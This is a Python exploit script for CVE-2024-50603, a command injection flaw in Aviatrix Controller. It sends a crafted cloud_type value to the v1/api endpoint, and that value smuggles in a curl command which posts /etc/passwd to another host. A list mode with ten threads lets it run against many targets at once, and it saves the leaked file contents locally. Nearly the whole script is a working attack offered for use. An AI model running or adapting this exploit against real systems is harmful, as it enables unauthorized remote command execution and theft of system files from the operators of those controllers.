"""
-*- coding: utf-8 -*-
@Project : CVE-2024-50603
@Version : Aviatrix Controller 7.x through 7.2.4820
@Author  : wodelilian
@Date    : 2025/3/7 18:19
Software : PyCharm
version  : Python 3.10
@File    : CVE-2024-50603.py
"""
import re
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor

urlpath = 'v1/api'
payload1 = 'cloud_type=1|$(curl+-X+POST+-F+"file=@/etc/passwd"+http://127.0.0.1)'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'
}


def checktarget(pattern, url):
    """
    :param pattern: Leakage scanning mode: alone/list
    :param url: target URL
    :return:
    """
    if str(pattern) == 'alone':
        if str(url[-1]) != "/":
            url = url + "/" + urlpath
        else:
            pass
        try:
            response = requests.post(url=url, data=payload1, headers=headers, verify=False, timeout=10)
            state = response.status_code
            if state == 200:
                print('Response successful, there may be a vulnerability in the target address, try to obtain more configuration file information\n')
                responseinfo = re.findall(r'daemon', response.text)
                if len(responseinfo) != 0:
                    f = open('etcpasswd.txt', 'w')
                    f.write(response.text)
                    f.close()
                    print("The data has been written to etcpassd.txt in the current path. Please check carefully")
                else:
                    print("The current IP execution failed, the vulnerability may not exist!")
        except Exception as e:
            print(e)
            print('The current IP execution failed, the vulnerability may not exist!')
    else:
        list = openfile(url)
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(batch, list)


def batch(url):
    try:
        if str(url[-1]) != "/":
            url = url + "/" + urlpath
        else:
            pass
        response = requests.post(url=url, data=payload1, headers=headers, verify=False, timeout=10)
        state = response.status_code
        if state == 200:
            responseinfo = re.findall(r'daemon', response.text)
            if len(responseinfo) != 0:
                print('The current URL may have vulnerabilities, please verify manually：' + url)
            else:
                print("There is no vulnerability in the current URL，PASS")
        else:
            print("There is no vulnerability in the current URL，PASS")
    except Exception as e:
        if "timeout" in str(e):
            print(url + "   timeout")
        else:
            print("Program exception" + str(e))


def openfile(filepath):
    """
    :param filepath: Enter the target URL file path
    :return: Return the URL in the file
    """
    urllist = []
    with open(filepath) as f:
        for url in f.readlines():
            url = url.replace("\n", "")
            if url != "":
                urllist.append(url)
    return urllist


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='python3 CVE-2024-50603.py -r [Pattern(alone list)] -u [IP Address] ',
        epilog='python3 -r alone -u http://127.0.0.1 or python3 -r list -u filename')
    parser.add_argument('-r', '--run',  help='Pattern(alone list)')
    parser.add_argument('-u', '--url',  help='Destination IP address or IP filepath')
    args = parser.parse_args()
    pattern = args.run
    url = args.url
    print(
        f"Author: Wodelilian\n"
    )
    checktarget(pattern, url)
